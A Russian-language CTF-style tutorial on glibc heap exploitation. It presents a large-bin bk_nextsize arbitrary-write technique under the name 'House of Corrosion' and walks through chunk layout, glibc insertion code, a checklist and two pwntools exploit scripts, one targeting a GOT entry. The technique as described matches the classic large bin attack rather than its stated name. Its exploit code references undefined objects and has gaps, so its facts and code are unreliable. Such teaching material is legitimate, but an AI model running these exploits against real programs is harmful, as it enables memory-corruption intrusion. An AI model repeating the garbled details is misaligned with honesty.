House of Corrosion — техника эксплуатации **large bin** в glibc версий примерно 2.27–2.30. Она использует поля `fd_nextsize`/`bk_nextsize`, которые есть только у large-чанков и связывают их в отдельный «размерный» список. В определённых версиях glibc операции с `bk_nextsize` не проверялись достаточно строго, что позволяло записать контролируемое значение по произвольному адресу.

В этом уроке — механика large bin, роль `bk_nextsize`, условия применимости и полный эксплойт. Материал продолжает `pwn-house-roman` и связан с `pwn-largebin-attack`.

## Что такое House of Corrosion

Large bin хранит чанки размером больше 0x400 (на 64-бит). В отличие от small bin, large bin упорядочен по размеру и использует **два** списка: обычный (`fd`/`bk`) и «размерный» (`fd_nextsize`/`bk_nextsize`). Когда чанк вставляется или извлекается, обновляются оба списка.

House of Corrosion эксплуатирует момент вставки чанка в large bin: при определённых условиях glibc присваивает `bk_nextsize->fd_nextsize = chunk` без должной проверки. Если `bk_nextsize` контролируется, вы получаете запись по адресу `bk_nextsize + 0x20`.

## Large bin и bk_nextsize

Структура large-чанка:

| Смещение | Поле | Назначение |
|---|---|---|
| +0x00 | prev_size | размер предыдущего |
| +0x08 | size | размер и флаги |
| +0x10 | fd | следующий в bin |
| +0x18 | bk | предыдущий в bin |
| +0x20 | fd_nextsize | следующий по размеру |
| +0x28 | bk_nextsize | предыдущий по размеру |

Именно `fd_nextsize`/`bk_nextsize` отличают large bin от small. При вставке нового чанка glibc идёт по размерному списку и обновляет связи; если указатели подделаны, запись уходит в цель.

## Версии glibc и условия

House of Corrosion работает в ограниченном диапазоне:

- **glibc 2.27–2.30.** В этих версиях `bk_nextsize` обрабатывается недостаточно строго.
- **glibc 2.31+.** Добавлены проверки (`chunk_main_arena`, консистентность nextsize), техника усложняется.
- **Нужен large-чанк** (> 0x400) и контроль над его `bk_nextsize`.
- **tcache** не должен перехватывать чанк (размер выше `tcache_max`).

Определяйте версию до начала: `ldd --version` или `pwn-libc-database`.

## Механика атаки

Схема:

1. Выделить несколько large-чанков разных размеров, чтобы large bin был «населён».
2. Освободить их так, чтобы они попали в large bin и связались по `fd_nextsize`/`bk_nextsize`.
3. Через UAF/переполнение подделать `bk_nextsize` нужного чанка, направив его на `target - 0x20`.
4. Вставить новый чанк так, чтобы сработало обновление `bk_nextsize->fd_nextsize = chunk`.
5. Получить запись адреса `chunk` по `target`.

Записываемое значение — адрес чанка (в куче), поэтому приём часто используют для записи heap-указателя (например, в `_IO_list_all` или GOT), а не произвольного байта.

## Разобранный пример

Пусть есть UAF на large-чанке. Подделываем `bk_nextsize`:

```python
from pwn import *
context.arch = 'amd64'

io = process('./chall')
# ... выделяем large-чанки 0x420, 0x440, 0x460 ...
# освобождаем, чтобы large bin связал их
free(0); free(1); free(2)

# подделываем bk_nextsize чанка idx2 -> target - 0x20
edit(2, p64(0) + p64(0x461) + p64(0) + p64(0)
        + p64(0) + p64(target - 0x20))

# вставляем новый large-чанк -> срабатывает обновление nextsize
alloc(0x480)

# проверяем запись
print(hexdump(show_target()))
```

Ожидаемый эффект: по адресу `target` появится heap-адрес чанка.

## Полный эксплойт

```python
from pwn import *
context.arch = 'amd64'

io = process('./chall')
def alloc(sz): io.sendline(f'alloc {sz}'.encode())
def free(i):   io.sendline(f'free {i}'.encode())
def edit(i,d): io.sendline(f'edit {i}'.encode()); io.send(d)

# 1. создаём large-чанки и связываем их в large bin
for sz in (0x420, 0x440, 0x460):
    alloc(sz)
free(0); free(1); free(2)

# 2. подделываем bk_nextsize среднего чанка
target = elf.got['free']
edit(2, flat(0, 0x461, 0, 0, 0, target - 0x20))

# 3. вставляем новый чанк -> запись
alloc(0x480)

# 4. теперь в target лежит heap-указатель; используем его для утечки/записи
io.interactive()
```

## Ограничения

- **Узкий диапазон версий.** В 2.31+ нужны обходы проверок.
- **Значение — heap-адрес.** Нельзя записать произвольный байт напрямую.
- **Требуется large-чанк.** Не сработает на мелких размерах.
- **Сложная раскладка.** Нужен точный heap feng shui.

## Large bin в деталях: вставка чанка

Чтобы понять Corrosion, нужно видеть, что происходит при вставке large-чанка. libc ищет в large bin подходящий по размеру чанк, идя по размерному списку `fd_nextsize`. Найдя место, она обновляет связи:

```c
// упрощённо, glibc 2.27
if (in_smallbin_range(size)) { ... }
else {
    // вставка в large bin по размеру
    while ((unsigned long) size < chunksize_nomask(fdn)) {
        fdn = fdn->fd_nextsize;
    }
    if ((unsigned long) size == chunksize_nomask(fdn)) { ... }
    else {
        bck = fdn->bk_nextsize;
        // обновление списка размеров
        fdn->bk_nextsize = chunk;
        chunk->fd_nextsize = fdn;
        chunk->bk_nextsize = bck;
        bck->fd_nextsize = chunk;   // <- запись по bck + 0x20
    }
}
```

Строка `bck->fd_nextsize = chunk` пишет адрес `chunk` по адресу `bck + 0x20`. Если `bck` (= `fdn->bk_nextsize`) подделан, запись уходит в цель. В версиях до 2.31 здесь не было проверки, что `bck` вообще принадлежит large bin, — отсюда атака. В 2.31+ добавили проверки консистентности, и техника усложнилась (нужны дополнительные условия или другой примитив).

## Практика: как выбрать цель записи

Corrosion пишет **адрес чанка** (heap-указатель), а не произвольное значение. Значит, цель должна быть такой, чтобы heap-указатель в ней был полезен. Классические цели:

- **`_IO_list_all`.** Записав туда heap-адрес подделанной `_IO_FILE`, вы переходите к FSOP (см. `pwn-house-water`).
- **Указатель в структуре.** Например, указатель на массив функций или vtable, который затем используется.
- **`global_max_fast`.** В старых glibc запись большого значения расширяла fastbin и открывала fastbin attack.
- **`stdout`/`stderr` указатели.** Для перенаправления потоков ввода-вывода.

Поскольку значение — адрес в куче, заранее подготовьте в куче структуру, на которую хотите «переключить» цель. Это типичный двухшаговый подход: сначала контролируемая heap-структура, потом запись на неё указателя.

## Пошаговый чек-лист Corrosion

1. **Версия glibc** — убедитесь, что она в диапазоне 2.27–2.30 (или найдите обход для новее).
2. **Доступные баги** — нужен контроль над `bk_nextsize` large-чанка (UAF/переполнение).
3. **Наполните large bin** — выделите несколько large-чанков разных размеров и освободите их так, чтобы они связались по `fd_nextsize`/`bk_nextsize`.
4. **Подделайте `bk_nextsize`** среднего чанка, направив на `target - 0x20`.
5. **Вставьте новый large-чанк** — сработает `bck->fd_nextsize = chunk`.
6. **Проверьте запись** — по `target` должен появиться heap-адрес.
7. **Используйте запись** — для перехода к FSOP или другому примитиву.

Отлаживайте через `bins` и `x/8gx` на каждом шаге. Если чанки не связываются по nextsize, проверьте, что они действительно large (> 0x400) и что tcache их не перехватил. Если запись не произошла — проверьте, что `bck` реально читается как `fdn->bk_nextsize`, и что новый чанк попадает в нужную ветку вставки.

## Практические заметки по отладке

Наблюдение за large bin отличается от наблюдения за small/unsorted. В pwndbg команда `bins` покажет large-чанки, но размерный список (`fd_nextsize`/`bk_nextsize`) придётся смотреть вручную: `x/8gx <chunk_addr>`. Полезно печатать адреса всех large-чанков и строить карту связей на бумаге. Если вы видите, что `bk_nextsize` не тот, что ожидали, — значит либо чанк не попал в large bin, либо порядок освобождения был неверным.

Ещё одна тонкость: `malloc` может «пропустить» ваш чанк, если в large bin есть более подходящий по размеру. Поэтому подбирайте размеры вставляемых чанков так, чтобы гарантированно активировать нужную ветку вставки. Иногда приходится добавлять «приманки» — чанки, которые заставляют алгоритм выбрать именно вашу ветку.

## Частые ошибки

- **Не та версия glibc.** Проверяйте версию до начала.
- **Путать fd/bk и fd_nextsize/bk_nextsize.** Поля разные.
- **Неверное смещение цели.** Ошибка на 0x10/0x20 уводит запись мимо.
- **Игнорировать tcache.** Large-чанки обычно мимо tcache, но проверяйте размер.
- **Нестабильный layout.** Готовьте кучу заранее.
